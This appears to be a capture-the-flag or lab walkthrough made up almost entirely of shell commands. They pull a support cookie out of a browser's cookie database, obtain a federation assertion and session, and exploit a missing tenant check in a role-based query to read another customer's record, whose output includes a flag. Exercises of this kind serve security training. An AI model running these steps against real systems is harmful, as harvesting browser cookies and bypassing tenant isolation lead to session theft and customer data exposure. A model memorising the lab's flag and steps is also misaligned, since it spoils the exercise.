## Prerequisites

K18.3 registered the retained-support provider on the support registration.
K17.1 gives the support cookie (read it from the browser cookie store):

```
CA=~/.local/share/keplerops/ca.crt
COOKIE=$(sqlite3 ~/.config/chromium/Default/Cookies "select value from cookies where name='fieldkest_support';")
```

## Read the support session and the history dossier

```
TEN=$(curl -sS --cacert $CA -H "Cookie: fieldkest_support=$COOKIE" https://support.keplerops.test/api/session | python3 -c "import sys,json;print(json.load(sys.stdin)['customer']['tenant'])")
DID=$(curl -sS --cacert $CA -H "Cookie: fieldkest_support=$COOKIE" https://support.keplerops.test/api/session | python3 -c "import sys,json;print(json.load(sys.stdin)['customer']['history_dossier'])")
DOS=$(curl -sS --cacert $CA -H "Cookie: fieldkest_support=$COOKIE" https://support.keplerops.test/api/customers/$TEN/dossiers/$DID)
SUBJECT=$(echo "$DOS" | python3 -c "import sys,json;print(json.load(sys.stdin)['reviewer_federation']['subject'])")
RECORD=$(echo "$DOS" | python3 -c "import sys,json;print(json.load(sys.stdin)['customer_record'])")
echo "tenant=$TEN subject=$SUBJECT record=$RECORD"
```

The dossier `reviewer_federation` gives the pairwise `subject`, and
`customer_record` names the record to read (for example `CUSTREC-047-R6`).

## Derive the audience from the retained-support provider

Read the provider discovery document and take its supported assertion audience
(do not guess the audience).

```
AUD=$(curl -sS --cacert $CA https://support.keplerops.test:8443/federation/retained-support/.well-known/openid-configuration | python3 -c "import sys,json;print(json.load(sys.stdin)['assertion_audiences_supported'][0])")
echo "audience=$AUD"   # fieldkest-support
```

## Get a signed assertion for the pairwise subject and tenant

```
ASSERTION=$(curl -sS --cacert $CA -X POST -H "Content-Type: application/json" \
  --data-binary "{\"audience\":\"$AUD\",\"subject\":\"$SUBJECT\",\"tenant\":\"$TEN\"}" \
  https://support.keplerops.test:8443/federation/retained-support/assertions \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['assertion'])")
```

## Log in through identity federation

The login returns the federated session cookie as a ready `name=value` string.

```
SESSION_COOKIE=$(curl -sS --cacert $CA -X POST -H "Content-Type: application/json" \
  --data-binary "{\"assertion\":\"$ASSERTION\"}" \
  https://identity.keplerops.test/api/federation/login \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['session_cookie'])")
echo "$SESSION_COOKIE"   # fieldkest_federated=<uuid>
```

## Read the customer record with the federated session (K18.4 acceptance check)

Send the returned cookie string as-is. The backend role check omits the
session-tenant predicate on this query, so the federated reviewer session reads
the customer record.

```
curl -sS --cacert $CA -H "Cookie: $SESSION_COOKIE" \
  https://support.keplerops.test/api/customers/$TEN/dossiers/$RECORD
```

Output:

```json
{"flag":"FLAG{b6cd284e8b911de5}","record_id":"CUSTREC-047-R6","tenant":"TEN-ARWC-047","federated_subject":"urn:fieldkest:pairwise:7c0e4f2a-2e62-4d80-a279-1fdb4f02b6c7",...}
```

Gate: a wrong audience is rejected with `audience_denied`; a wrong subject with
`subject_denied`; the assertion is single-use.
